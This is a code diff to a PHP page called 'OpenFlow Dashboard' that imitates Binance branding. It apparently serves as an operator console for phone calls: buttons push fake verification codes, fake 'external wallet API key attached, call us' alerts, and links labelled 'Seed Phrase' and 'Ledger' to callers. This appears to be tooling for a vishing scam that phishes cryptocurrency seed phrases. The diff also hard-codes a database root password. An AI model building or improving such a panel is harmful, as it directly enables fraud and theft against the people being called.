@@ -6,7 +6,7 @@ date_default_timezone_set('Europe/London');
 $agent  = $_GET['agent']  ?? 'Unknown';
 $caller = $_GET['caller'] ?? 'Unknown';
 
-$conn = mysqli_connect('localhost', 'root', '', 'fromzero_morevitility');
+$conn = mysqli_connect('localhost', 'root', '$Provis@2025', 'fromzero_morevitility');
 if ($conn && $agent !== 'Unknown') {
     $eAgent = mysqli_real_escape_string($conn, $agent);
     $sql = "SELECT role FROM ausers WHERE user = '$eAgent' LIMIT 1";
@@ -59,7 +59,9 @@ function insertdata($conn, $agent, $caller)
     <title>OpenFlow Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>    <script>
         tailwind.config = {
             darkMode: 'class',
             theme: {
@@ -72,6 +74,11 @@ function insertdata($conn, $agent, $caller)
             }
         };
     </script>
+    <style>
+        #toast-container>div {
+            width: 350px;
+        }
+    </style>
 </head>
 
 <body class="dark:bg-binance-bg-dark bg-white text-white font-sans min-h-screen">
@@ -90,18 +97,18 @@ function insertdata($conn, $agent, $caller)
         </div>
     </header>
     <div class="px-4 mt-3 mb-4">
-        <h1 class="md:text-4xl text-lg font-bold text-[#232323] dark:text-white">OpenFlow Dashboard</h1>
-        <p class="md:text-xl mt-2 text-[#949597]">Manage verification and triggers customer communication during active calls.</p>
+        <h1 class="md:text-3xl text-lg font-bold text-[#232323] dark:text-white">OpenFlow Dashboard</h1>
+        <p class="md:text-lg mt-1 text-[#949597]">Manage verification and triggers customer communication during active calls.</p>
     </div>
 
     <!-- Main Container -->
-    <div class="flex block justify-center md:px-4 px-2 py-4">
-        <div class="md:max-w-md  relative">
+    <div class="flex  justify-center md:px-4 px-2 py-4">
+        <div class="md:max-w-md md:min-w-[28rem] relative">
 
             <!-- Reference Input -->
             <div class="flex items-center space-x-2 mb-8">
-                <input type="text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
-                <button class="bg-[#659c36] px-4 py-[14px] rounded text-white text-xl font-bold">
+                <input type="text" id="ref-text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
+                <button id="verified" class="cursor-default bg-gray-500 px-4 py-[14px] rounded text-white text-xl font-bold">
                     <span>
                         <svg fill="#ffffff" class="w-7" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                             <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
@@ -115,31 +122,41 @@ function insertdata($conn, $agent, $caller)
             </div>
 
             <!-- Buttons and Info Boxes -->
+
+            <?php if ($agent === 'Unknown' || $caller === 'Unknown'): ?>
+                <div class="absolute inset-0 bg-gray-900 bg-opacity-70 flex flex-col items-center justify-center z-50 rounded">
+                    <div class="bg-red-600 text-white px-6 py-4 rounded shadow-lg text-center max-w-xs">
+                        <strong>Warning:</strong><br>
+                        Agent or Caller information is missing from the URL.<br>
+                    </div>
+                </div>
+            <?php endif; ?>
+
             <div class="space-y-8">
                 <!-- Verify -->
                 <div class="mb-8">
-                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Verify</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
+                    <button id="btn-reference-verify" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Verify</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
                         <strong>Example:</strong><br>
-                        Your verification code is <strong>876-872</strong><br>
-                        Never share this code with anyone. Only a genuine advisor will confirm it to you.
+                            Your verification code is <span id="verification-code" class="font-bold"><!-- dynamic data--></span><br>
+                            Never share this code with anyone. Only a genuine advisor will confirm it to you.
                     </div>
                 </div>
 
                 <!-- API Key -->
                 <div class="mb-8">
-                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
+                    <button id="btn-api-key" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
                         <strong>Example:</strong><br>
                         API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on <br>
-                        +61 1800576977 or +61 26105933
+                        <span id="support-phone"><!-- dynamic data--></span>
                     </div>
                 </div>
 
                 <!-- API key cancel -->
                 <div class="mb-8">
-                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
+                    <button id="btn-api-cancel" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
                         <strong>Example:</strong><br>
                         External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
                     </div>
@@ -147,25 +164,25 @@ function insertdata($conn, $agent, $caller)
 
                 <!-- Seed Phrase -->
                 <div class="mb-8">
-                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
+                    <button id="btn-seed-phrase" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
                         <strong>Example:</strong><br>
-                        seed.com/ref123
+                        <span id="seed-url"><!-- dynamic data--></span>
                     </div>
                 </div>
 
                 <!-- Ledger -->
                 <div class="mb-8">
-                    <button class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
-                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded">
+                    <button id="btn-ledger" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 p-3 rounded hidden">
                         <strong>Example:</strong><br>
-                        ledge.com
+                        <span id="ledger-url"><!-- dynamic data--></span>
                     </div>
                 </div>
 
                 <!-- Block -->
                 <div>
-                    <button class="text-white font-semibold bg-red-500 rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-red-500">Block</button>
+                    <button id="btn-block" class="text-white font-semibold bg-red-500 rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-red-500">Block</button>
                 </div>
             </div>
 
@@ -177,6 +194,7 @@ function insertdata($conn, $agent, $caller)
     </div>
 
     <script src="./assets/js/theme.js"></script>
+    <script src="./assets/js/script.js"></script>
 
 </body>
 
